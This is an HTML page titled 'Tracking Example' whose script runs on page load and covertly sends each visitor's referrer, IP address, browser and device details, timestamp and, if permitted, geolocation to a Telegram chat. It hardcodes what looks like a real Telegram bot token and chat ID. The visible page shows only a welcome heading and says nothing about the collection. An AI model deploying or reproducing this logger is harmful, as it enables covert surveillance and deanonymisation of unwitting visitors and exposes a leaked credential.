<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tracking Example</title>
    <script>
        // Your Telegram Bot Token
        const BOT_TOKEN = '1848113090:AAHt8IFMRQ5JD4DjKe-AihZJuiD48u-uyp0';
        // Your Chat ID (where the messages will be sent)
        const CHAT_ID = '-1001774957665'; 

        // Function to send data to Telegram
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: CHAT_ID,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => {
                if (!response.ok) {
                    console.error('Error sending message to Telegram');
                }
            }).catch(error => {
                console.error('Network error:', error);
            });
        }

        // Function to collect and send user information
        async function collectInfo() {
            // Get referrer information
            const referrer = document.referrer || 'Direct visit';

            // Get IP address
            try {
                const ipAddressResponse = await fetch('https://api64.ipify.org?format=json');
                const { ip } = await ipAddressResponse.json();

                // Get browser name and version
                const browserInfo = `Browser: ${navigator.appName} ${navigator.appVersion}`;

                // Get device name
                const deviceInfo = `Device: ${navigator.platform}`;

                // Get timestamp
                const timestamp = new Date().toISOString();

                // Try to get geolocation if user consents
                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        const { latitude, longitude } = position.coords;
                        const geolocation = `Latitude: ${latitude}, Longitude: ${longitude}`;

                        // Send collected information to Telegram
                        sendToTelegram(`Referrer: ${referrer}\nIP Address: ${ip}\nBrowser: ${browserInfo}\nDevice: ${deviceInfo}\nTimestamp: ${timestamp}\nGeolocation: ${geolocation}`);
                    },
                    async function(error) {
                        console.error('Error getting geolocation:', error);
                        // Send collected information without geolocation if user denies permission
                        sendToTelegram(`Referrer: ${referrer}\nIP Address: ${ip}\nBrowser: ${browserInfo}\nDevice: ${deviceInfo}\nTimestamp: ${timestamp}`);
                    }
                );
            } catch (error) {
                console.error('Error getting IP address:', error);
                // Send only referrer information to Telegram if IP address retrieval fails
                sendToTelegram(`Referrer: ${referrer}`);
            }
        }

        // Track page visit
        window.onload = async function() {
            await collectInfo();
        };
    </script>
</head>
<body>
    <h1>Welcome to the Tracking Example Page</h1>
</body>
</html>
